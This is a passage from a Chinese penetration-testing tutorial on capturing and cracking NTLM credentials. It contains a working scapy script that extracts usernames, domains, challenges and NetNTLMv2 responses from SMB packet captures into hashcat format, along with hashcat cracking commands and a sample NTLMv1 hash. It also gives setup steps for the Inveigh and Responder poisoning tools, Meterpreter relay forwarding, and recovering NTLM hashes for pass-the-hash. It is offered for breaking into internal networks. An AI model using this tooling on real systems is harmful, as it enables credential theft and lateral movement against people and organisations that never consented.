-m: hash-type，5600对应NetNTMLv2  
-o：输出文件  
字典文件路径 /tmp/password.list  
\--force 代表强制执行
在这里使用wilsonlee1 师傅的原生脚本修改而成！
使用过程：
这里需要在wireshark中另存为保存成pcap格式，脚本中对应的名字为ntlm.pcap，将它和脚本放在同一个文件夹下。  
安装 **pip install scapy-http**
    #!/usr/bin/env python2.7
    import re
    try:
          import scapy.all as scapy
    except ImportError:
          import scapy
    try:
        # This import works from the project directory
          import scapy_http.http
    except ImportError:
        # If you installed this package via pip, you just need to execute this
          from scapy.layers import http
    packets = scapy.rdpcap('NTLM_2.pcap')
    Num = 1
    for p in range(len(packets)):
          try:
                if packets[p]['TCP'].dport ==445:
                      TCPPayload = packets[p]['Raw'].load
                      if TCPPayload.find('NTLMSSP') != -1:
                            if len(TCPPayload) > 500:
                                  print ("----------------------------------Hashcat NTLMv2  No.%s----------------------------------"%(Num))
                                  Num = Num+1
                                  print ("PacketNum: %d"%(p+1))
                                  print ("src: %s"%(packets[p]['IP'].src))
                                  print ("dst: %s"%(packets[p]['IP'].dst))
                                  Flag = TCPPayload.find('NTLMSSP')
                                  ServerTCPPayload = packets[p-1]['Raw'].load
                                  ServerFlag = ServerTCPPayload.find('NTLMSSP')
                                  ServerChallenge =  ServerTCPPayload[ServerFlag+24:ServerFlag+24+8].encode("hex")
                                  print ("ServerChallenge: %s"%(ServerChallenge))
                                  DomainLength1 =  int(TCPPayload[Flag+28:Flag+28+1].encode("hex"),16)
                                  DomainLength2 =  int(TCPPayload[Flag+28+1:Flag+28+1+1].encode("hex"),16)*256                             
                                  DomainLength = DomainLength1 + DomainLength2
                                  #print DomainLength
                                  DomainNameUnicode = TCPPayload[Flag+88:Flag+88+DomainLength]
                                  DomainName = [DomainNameUnicode[i] for i in  range(len(DomainNameUnicode)) if i%2==0]
                                  DomainName = ''.join(DomainName)
                                  print ("DomainName: %s"%(DomainName))
                                  UserNameLength1 =  int(TCPPayload[Flag+36:Flag+36+1].encode("hex"),16)
                                  UserNameLength2 =  int(TCPPayload[Flag+36+1:Flag+36+1+1].encode("hex"),16)*256                             
                                  UserNameLength = UserNameLength1 + UserNameLength2
                                  #print UserNameLength
                                  UserNameUnicode =  TCPPayload[Flag+88+DomainLength:Flag+88+DomainLength+UserNameLength]
                                  UserName = [UserNameUnicode[i] for i in  range(len(UserNameUnicode)) if i%2==0]
                                  UserName = ''.join(UserName)
                                  print ("UserName: %s"%(UserName))
                                  NTLMResPonseLength1 =  int(TCPPayload[Flag+20:Flag+20+1].encode("hex"),16)
                                  NTLMResPonseLength2 =  int(TCPPayload[Flag+20+1:Flag+20+1+1].encode("hex"),16)*256
                                  NTLMResPonseLength = NTLMResPonseLength1 + NTLMResPonseLength2                             
                                  # print NTLMResPonseLength
                                  NTLMResPonse =  TCPPayload[Flag+140:Flag+140+NTLMResPonseLength].encode("hex")
                                  NTLMZONG = packets[p]['Raw'].load.encode("hex")
                                  # print NTLMZONG
                                  NTLM_FINDALL =  re.findall('3.00000000000000000000000000000000000000000000000000(.*)',NTLMZONG)
                                  # print NTLM_FINDALL
                                  #print NTLMResPonse
                                  print "Hashcat NTLMv2:"
                                  print  ("%s::%s:%s:%s:%s"%(UserName,DomainName,ServerChallenge,NTLM_FINDALL[0][:32],NTLM_FINDALL[0][32:632]))
                                  # print(NTLMResPonse)
          except:
                pass
最后使用命令爆破
    hashcat -m 5600 xxxxxxx password.list -o found.txt --force
成功的话只能爆破一次，第二次会显示这个
如果密码本没有对应密码，失败后不会和上面一样无法再次爆破！
这里的脚本参考至 HMAC-MD5和blobb
不为固定值，笔者在这里的修改方法是正则3.00000000000000000000000000000000000000000000000000(.*)
后取相应的位数取出才正确。如各位实验时发现我的脚本不能输出后面部分的数据，那代表着正则失败。各位可以自行修改，提示这么清楚了不应该不会修改。在校验正确部分，笔者使用了win12
win2008 win7进行多次访问皆成功。
脚本已附件上传
V1部分
    hashcat -m 5500 admin::HACKE:45B00867AA7E390300000000000000000000000000000000:B8B6EE531C6AE9263284299933C2884E6F947264C023F1F9:e457a0455bb5bcaf password.list -o found.txt --force
# 0x04 windows版本工具与反代MSF监听
此模块主要处理监听工具大部分在linux运行的问题，大家可能进内网的跳板的是server系列的。或者域内拿下的是win的主机，这个时候就没法使用Responder.py了。别看是py，但是某些模块只有linux上能跑。
网上绝大多数教程全是用的kali去演示，很容易让新手陷入一种使用kali远程日人家内网的迷惑感，结果实战一搞发现win不能用 linux py版本有问题。
因每个人的测试环境不同，所以我测试执行与否可能与你的相差甚大。请学习后主动动手实践！
## 1.Responder.exe
笔者在测试这款工具时使用了win7 2008 2012 ，但是无法看到欺骗成功的Net NTLM Hash 。
下载链接如下：
    https://github.com/lgandx/Responder-Windows
    https://github.com/HamzaKHIATE/Toolbox/tree/master/Responder
## 2.powershell版本的 Inveigh
导入命令
    Get-ExecutionPolicy
    Set-ExecutionPolicy Unrestricted
    Import-Module .\Inveigh.psd1
    Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y
win7  
win2012 win2008无法获取到  
文章参考地址
    https://www.anquanke.com/post/id/83671
    https://blog.netspi.com/inveigh-whats-new-in-version-1-4/
下载地址
    https://github.com/Kevin-Robertson/Inveigh
## 3.c#版本的 Inveigh
此版本需要下载编译！
适用版本为.net 3.5
，但是在笔者编译测试后发现只能在win7上运行抓取成功，且没过多久就崩溃了。也可能是笔者编译环境的问题所致，总之大家要手动去尝试下！
下载地址
    https://github.com/Kevin-Robertson/InveighZero
## 4.端口反代转发，由外网去监听
linux中的Responder.py只能监听本网段的IP，且它是被动监听，和我们流量代理进行是不一样的。这种方法大家可以实践一下，就是实现起来很麻烦，且需要对应dll。最后笔者安装完dll，程序跑起来后没有收到回来的流量就搁浅了。在这里说一下各种坑，大家避开可以更快的实验！
DivertTCPconn-master
转发工具使用过程中出现问题，缺少dll。缺失的dll可以在物理机中寻找对应版本，然后复制到system32下。安装完缺失的dll后需要安装vc_redist.x64.exe。
    https://download.microsoft.com/download/9/3/F/93FCF1E7-E6A4-478B-96E7-D4B285925B00/vc_redist.x64.exe
    https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/
    https://github.com/lzb960827/DivertTCPconn
参考文章
    https://www.freebuf.com/articles/system/183700.html
# 0x05 NTLM其他玩法
在这里描述几种其他的玩法，让你更快的通过NTLM欺骗获取权限！  
## 1.NTLM v1 还原NTLM hash
从头认真开始读的朋友肯定知道下面是哪种协议的hash值
在开头我就说了v1、v2都可以用来破解。但是v1因为安全性不高可以还原出NTLM HASH
用来PTH攻击。但是v1从2008及以上就无了，只有2003这种才有。但是没准你就碰到2003机器的v1了呢。
拿到上述图中的代码后，你可以按照下面那个格式填写
    NTHASH:LM Hash
    NTHASH:aebc606d66e80ea649198ed339bda8cd7872c227d6baf33a